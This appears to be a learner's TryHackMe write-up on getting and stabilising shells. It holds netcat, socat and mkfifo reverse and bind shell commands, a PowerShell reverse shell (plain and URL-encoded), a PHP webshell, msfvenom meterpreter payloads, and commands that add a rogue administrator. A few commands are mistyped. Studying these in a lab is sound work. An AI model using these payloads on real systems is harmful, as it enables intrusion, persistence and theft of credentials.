Task 5  Netcat Shell Stabilisation
----------------------------------

There are many ways to stabilise netcat shells on Linux systems.

We'll be looking at **`three`** here.

Stabilisation of Windows reverse shells tends to be significantly harder; however, the ***second technique*** that we'll be covering here is particularly useful for it.

<ins>Technique 1: Python</ins>

1. `python -c 'import pty;pty.spawn("/bin/bash")'` python or python or python3

2. `export TERM=xterm` -- this will give us access to term commands such as `clear`
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`

This does two things:

1. first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).

2. foregrounds the shell, thus completing the process.


#### Note:
Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo).

To fix this, type `reset` and press enter.


<ins>Technique 2: rlwrap</ins>


rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.


Syntax:
`rlwrap nc -lvnp <port>`


#### Note:
Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell.

**This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise**.


<ins>Technique 3: Socat</ins>

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

---------------------------------------------------------------------------------

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:

![](https://github.com/reveng007/TryHackMe/blob/main/_SUBSCRIPTION_/paths/Complete%20Beginner/07.Shells%20and%20Privilege%20Escalation/01.What%20the%20Shell%3F/pic1.png?raw=true)


Next, in your reverse/bind shell, type in:

```
stty rows <number>
```
and
```
stty cols <number>
```

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

1. How would you change your terminal size to have 238 columns?

--> stty cols 238

2. What is the syntax for setting up a Python3 webserver on port 80?

--> sudo python3 -m http.server 80


Task 6  Socat
--------------

Socat is similar to netcat in some ways, but fundamentally different in many others.

**The easiest way to think about socat is as a connector between two points**. In the interests of this room, this will essentially be a _listening port_ and the _keyboard_, however, it could also be a _listening port_ and _a file_, or indeed, _two listening ports_.


<ins>Reverse Shells</ins>

Syntax for socat gets a lot harder than that of netcat
```
socat TCP-L:<port> -
```

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

On Windows we would use this command to connect back:
```
socat TCP:<Attacker-IP>:<Attacker-PORT> EXEC:powershell.exe,pipes
```

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:
`socat TCP:<attacker-IP>:<attacker-port> EXEC:"bash -li"`

#### My Xp:

> This `Socat` command provides hell of a shell. I was even able to connect back to my ssh (running) service from the generated shell prompt.


<ins>Bind Shells</ins>


On a Linux target we would use the following command:
```
socat TCP-L:<PORT> EXEC:"bash -li"
```

On a Windows target we would use this command for our listener:
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

#### NOTE:
We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.


payload script(bind shell) on any attacking machine:
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
---------------------------------------------------------------------------------

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell.

This will only work when the target is Linux, but is significantly more stable. 


Here is the new listener syntax:
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
We're connecting two points together.

In this case those points are a listening port, and a file.

#### NOTE:
Specifically, we are allocating a new tty, and setting the echo to be zero. This is approximately ***equivalent*** to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and allocating a full tty.


The first normal socat listener can be connected to with any payload; however, this special socat listener must be activated with a very specific socat command.

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

#### NOTE:
For this command to work, ***socat*** must be installed on the target machine. However, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.


Lets break the above mentioned command:

The first part is easy.
The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: `pty`, `stderr`, `sigint`, `setsid` and `sane`:


	- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process

	- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)

	- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell

	- **setsid**, creates the process in a new session
	- **sane**, stabilises the terminal, attempting to "normalise" it.

Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.
---------------------------------------------------------------------------------

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.


1. How would we get socat to listen on TCP port 8080?

--> tcp-l:8080


Task 7  Socat Encrypted Shells
-------------------------------

One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse.

Encrypted shells cannot be spied on unless you have the decryption key, and are often able to _bypass an IDS_ as a result.


We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
> This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. 

When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.


We then need to merge the two created files into a single `.pem` file:
```
cat shell.key shell.crt > shell.pem
```

Now, when we set up our reverse shell listener, we use `OPENSSL` in place of `TCP`:

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
This sets up an OPENSSL listener using our generated certificate.
`verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.

Please note that the certificate <ins>must</ins> be used on whichever device is listening.


To connect back, we would use:
```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```


<ins>The same technique would apply for a bind shell</ins>:

Target:
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Attacker:
```
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.


1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

--> `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0`

2. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

--> `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`



Task8:  Common Shell Payloads
--------------------------------

We'll soon be looking at generating payloads with msfvenom, but before we do that, let's take a look at some common payloads using the tools we've already covered.



 In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows you to execute a process on connection.

For example, as a listener:
```
nc -lvnp <PORT> -e /bin/bash
```

Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.


#### NOTE:
On Windows where a static binary is nearly always required anyway, this technique will work perfectly.


On Linux, however, we would instead use this code to create a listener for a bind shell:

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`


The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.


A very similar command can be used to send a netcat reverse shell:
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
---------------------------------------------------------------------------------

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

This command is very ***convoluted***, so for the _sake of simplicity_ it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
For other common reverse shell payloads, [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.


### NOTE: I wasn't able to run this `cmd` in windows 10 (in my env) unless, I chnged by windows security settings(Virus & threat protection settings)

see: [Turn off Defender antivirus protection in Windows Security](https://support.microsoft.com/en-us/windows/turn-off-defender-antivirus-protection-in-windows-security-99e6004f-c54c-8509-773c-a4d776b77960)


1. What command can be used to create a named pipe in Linux?

--> mkfifo




Task 9  msfvenom
-----------------

Msfvenom: the one-stop-shop for all things payload related.

It can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

<ins>Staged vs Stageless</ins>

1. **Staged**

**Staged payloads** are sent in two parts.

i) _stagers_
ii) _stages_

#### Explanation:
The first part is called the _stager_. This is a piece of code which is executed directly on the victim machine. It connects back to a waiting listener (attacker), but doesn't actually contain any reverse shell code by itself. And _via this established connection_, **stager** loads the **real bulk payload (stage)**, executing it directly and preventing it from _`touching the disk`_ where it could be caught by _traditional anti-virus solutions_.

So, _stager_ is only used to establish connection b/w attacker and victim and load _stage_ and _stage_ does complex tasks like VNC, Meterpreter, etc...


#### Analogy:

Scenario: War is about to happen...

Group1: Victim

Group2: Attacker

Suppose, there is a cliff b/w Group1 and Group2. Only way to attack **Group1 (Victim)** by **Group2 (Attacker)** is to _build/open a bridge_ upon on the cliff. _Stager_ comes to the rescue, he will build/open a bridge b/w **attacker** and **victim** _(Just like, Bibhishon on Ramayana)_, then with the help of the **bridge (established connection)** ***bulk  army (bulk payload/stages) are transferred***.


2. **Stageless**

payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.


> Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.

> **`Staged payloads`** are _harder_ to use, but the _initial stager_ is a lot shorter, and is sometimes `missed` by _less-effective antivirus software_.

Modern day antivirus solutions will also make use of the **Anti-Malware Scan Interface (AMSI)** to detect the payload as it is ***loaded into memory*** by the stager, <ins>making stageless payloads less effective than they would once have been</ins>.


<ins>Payload Naming Conventions</ins>
`<OS>/<arch>/<payload>`

For Eg:
`linux/x86/shell_reverse_tcp`

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

`windows/shell_reverse_tcp`

For a 64bit Windows target, the arch would be specified as normal (x64)

`windows/x64/shell_reverse_tcp`


#### Explanation:

`shell_reverse_tcp` indicates that it was a stageless payload.

How?

Stageless payloads are denoted with underscores (`_`).

The staged equivalent to this payload would be:
`shell/reverse_tcp`

As staged payloads are denoted with another forward slash (`/`).


Aside from the `msfconsole` man page, the other important thing to note when working with msfvenom is:

`msfvenom --list payloads`


1. Which symbol is used to show that a shell is stageless?

--> `_`

2. What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`

--> `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`



Task 10  Metasploit multi/handler
----------------------------------

1. What command can be used to start a listener in the background?

--> exploit -j

2. If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?

--> sessions 10



Task 11  WebShells
------------------

Linux portion is well explained here: [Upload Vulnerabilities Room](https://github.com/reveng007/TryHackMe/tree/main/_SUBSCRIPTION_/paths/Complete%20Beginner/04.Web%20Hacking%20Fundamentals/06.Upload%20Vulnerabilities)


As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

In a very basic one line format:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.


When the target is Windows:

It is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server.

With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.


Task12: Next Steps
-------------------

We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal.

So, what can we do about this?

On **Linux** ideally we would be looking for opportunities to gain access to a user account. Finding credentials like ssh keys to gain a **proper shell** or executing some **exploits** to _add our very own accounts_ or perform **BOF** to _gain shell_ access, or cracking password from /etc/passwd and /etc/shadow due to  inappropiate file permission.


On **Windows**, the options are often _more limited_. It's sometimes possible to find **passwords** for _running services in the registry_. [VNC servers](https://discover.realvnc.com/what-is-vnc-remote-access-technology)(Remote access/screen sharing software), for example, frequently leave ***passwords in the registry stored in plaintext***. 


Some versions of the FileZilla FTP server also leave credentials in an XML file at`C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`. This can be MD5 hashes or in plaintext, depending on the version. 


##### Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to **simply add your own account (in the administrators group)** to the machine, then log in over _RDP_, _telnet_, _winexe_, _psexec_, _WinRM_ or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

```
net user <username> <password> /add
```

```
net localgroup administrators <username> /add
```

<ins>The important take away from this task:</ins>

> Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.


Task 13  Practice and Examples
-------------------------------

1. Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.

2. Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

3. Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

4. Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

5. Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques. Try to analyse them and see why they work.

6. Switch to the Windows VM. Try uploading and activating the `php-reverse-shell`. Does this work?

7. Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

Use: `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`


Then run the query on the browser:
```
http://10.10.231.162/uploads/php-reverse-shell_windows.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.8.112.253%27%2C1234)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22%0A```
```

The above encoded link/query has a small thing to notice in the first line:
```
http://10.10.231.162/uploads/php-reverse-shell_windows.php?cmd=powershell
```

`cmd=powershell`: This means whatever garbage value we input from attacker machine, it would open powershell...

But the thing is, **We have to give some command otherwise the GET parameter will not get activated**. Once it is actived, our inputed value will be overwritten by _powershell_ keyword present as a parameter in the web request


8. The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

```
net user reveng007 password /add
```
```
nc localgroup administrators reveng007 /add
```

##### Now logging into the user reveng007 account, that we made


9. Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

10. Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=<tun0-ip> LPORT=2020
```

`upload the shell.exe via upload in web server`

`run 'msfconsole' in attacker's terminal`

`'run multi/handler'`

```
set LHOST=<tun0-ip> ,set LPORT=2020 , set payload to 'windows/x64/meterpreter/reverse_tcp'
```
`exploit`


11. Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?

--> No, not getting any shell, but we get connected to linux/windows trgt.


For Windows,
```
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o stagedcmd.exe LHOST=<tun-0-ip> LPORT=4444
```
```
msfvenom -p windows/x64/meterpreter_reverse_shell -f exe -o nonstagedcmd.exe LHOST=<tun0-ip> LPORT=4444
```
All these binaries are present in the `Windows_.... folder`

For Linux,
```
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o stagedshell LHOST=10.8.112.253 LPORT=4444
```
```
msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o nonstagedshell LHOST=10.8.112.253 LPORT=4444
```
#### NOTE:
> I have took ELF executable, as we can't make exe file with these elf based payload

All these binaries are present in the `Linux_.... folder`

But I can get shell on `exploit/multi/handler`


